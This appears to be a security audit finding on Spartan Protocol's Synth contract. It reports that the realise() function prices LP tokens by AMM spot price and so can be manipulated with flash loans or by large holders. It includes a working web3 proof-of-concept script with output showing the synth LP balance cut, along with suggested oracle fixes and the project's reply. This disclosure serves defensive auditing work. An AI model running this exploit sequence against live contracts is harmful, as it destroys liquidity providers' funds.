@@ -1,0 +1,14 @@
+[H-05] Synthrealiseis vulnerable to flash loan attacks
+Submitted by jonah1005, also found by adelamo_
+Synthrealisefunction calculatesbaseValueLPandbaseValueSynthbase on AMM spot price which is vulnerable to flash loan attack.Synth’s lp is subject torealisewhenever the AMM ratio is different than Synth’s debt ratio.
+The attack does not necessarily require a flash loan. A big whale of the lp token holders could keep callingrealiseby shifting token ratio of AMM pool back and forth.
+The vulnerability is located atSynth.solL187-L199. Where the formulahereis dangerous.
+Here’s a script for conducting flashloan attack:
+flashloan_amount = init_amountuser = w3.eth.accounts[0]marked_token.functions.transfer(user, flashloan_amount).transact()marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})token_pool.functions.addForMember(user).transact({'from': user})received_lp = token_pool.functions.balanceOf(user).call()synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()token_synth.functions.realise(token_pool.address).transact()token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})token_pool.functions.removeForMember(user).transact({'from': user})token_synth.functions.realise(token_pool.address).transact()synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()print('synth_lp_balance_after_realise', synth_balance_after_realise)print('synth_lp_balance_before_realise', synth_balance_before_realise)
+Output:
+synth_balance_after_realise 1317859964829313908162synth_balance_before_realise 2063953488372093023256
+Calculating Lp token’s value base on AMM protocol is known to be dangerous.
+There are a few steps that might solve the issue:
+calculate token’s price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.calculate lp token value based on anti-flashloan formula.  Alpha finance’s formula is a good reference:https://blog.alphafinance.io/fair-lp-token-pricing
+verifyfirst (Spartan) confirmed and disagreed with severity:
+A proposal has been suggested to limit the use of realise() for a DAO proposal. This will allow only liquidity providers to choose the outcome of a function that directly affects them.
